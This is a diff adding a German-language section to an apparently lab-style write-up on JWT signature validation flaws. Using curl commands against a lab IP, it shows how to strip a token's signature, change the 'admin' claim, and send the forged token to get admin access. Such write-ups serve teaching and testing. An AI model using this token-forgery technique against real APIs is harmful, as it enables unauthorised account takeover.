@@ -86,3 +86,55 @@ payload = jwt.decode(token, self.secret, algorithms="HS256")
 username = payload['username'] 
 flag = self.db_lookup(username, "flag")
 ```
+
+# Signature Validation Mistakes
+
+Der zweite häufige Fehler bei JWTs ist die nicht korrekte Überprüfung der Signatur. Wenn die Signatur nicht korrekt überprüft wird, kann ein Angreifer möglicherweise einen gültigen JWT-Token fälschen, um Zugriff auf das Konto eines anderen Benutzers zu erhalten. Sehen wir uns die häufigsten Probleme bei der Signaturüberprüfung einmal genauer an.
+
+## Not Verifying the Signature
+
+Das erste Problem bei der Signaturvalidierung tritt auf, wenn keine Signaturvalidierung stattfindet. Wenn der Server die Signatur des JWT nicht überprüft, ist es möglich, die Claims im JWT nach Belieben zu ändern. Es ist zwar ungewöhnlich, dass APIs keine Signaturvalidierung durchführen, aber es kann vorkommen, dass die Signaturvalidierung bei einem einzelnen Endpunkt innerhalb der API ausgelassen wurde. Je nach Sensibilität des Endpunkts kann dies erhebliche geschäftliche Auswirkungen haben.
+
+### Beispiel 
+Gegebenheit API via http://10.10.187.114/api/v1.0/example2
+
+Zuerst Authentifizieren wir uns einmal als Normaler user via:
+```
+curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password2" }' http://10.10.187.114/api/v1.0/example2
+```
+
+Nachdem dass passiert ist können wir einmal unseren User verifizieren via 
+
+```
+curl -H 'Authorization: Bearer [JWT Token]' http://10.10.187.114/api/v1.0/example2?username=user
+```
+
+Nach der Authentifizierung des Normalen Users bekommen wir als Antwort den JWT wie hier zum Beispiel: 
+
+`"token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0.UWddiXNn-PSpe7pypTWtSRZJi1wr2M5cpr_8uWISMS4"`
+
+Versuchen wir jedoch, unseren Benutzer ohne die Signatur zu verifizieren, entfernen wir den dritten Teil des JWT (und lassen nur den Punkt stehen) und stellen wir die Anfrage erneut. Werden wir sehen, dass die Verifizierung weiterhin funktioniert! Das bedeutet, dass die Signatur nicht überprüft wird.
+
+Um den Token zu Modifizieren können wir uns den jetzt einmal via https://www.jwt.io/ decoden lassen und sehen das die Decoded Payload wie Folgt ist: 
+
+```
+{
+
+  "username": "user",
+
+  "admin": 0
+
+}
+```
+
+Anhand dessen können wir jetzt versuchen in der Payload den wert bei admin von 0 auf 1 zu setzen und uns dann den Token wieder encoden lassen. Sollte so aussehen: 
+
+`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MX0.9SCUBKr8YVDh0y5dClP7JZsjWpHPOojJ3ywGvhqU3v8` 
+
+Da wir uns nun als Admin verifizieren lassen wollen müssen wir zudem noch die Anfrage anpassen, das '=user' am ende wird zu '=admin' um den admin user zu wählen. Die Fertige anfrage mit Modifizierten JWT und User sieht dann wie Folgt aus: 
+
+```
+curl -H 'Authorization: Bearer ["eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MX0.9SCUBKr8YVDh0y5dClP7JZsjWpHPOojJ3ywGvhqU3v8"]' http://10.10.187.114/api/v1.0/example2?username=admin
+```
+
+Und schon erkennt uns die API als Admin an.
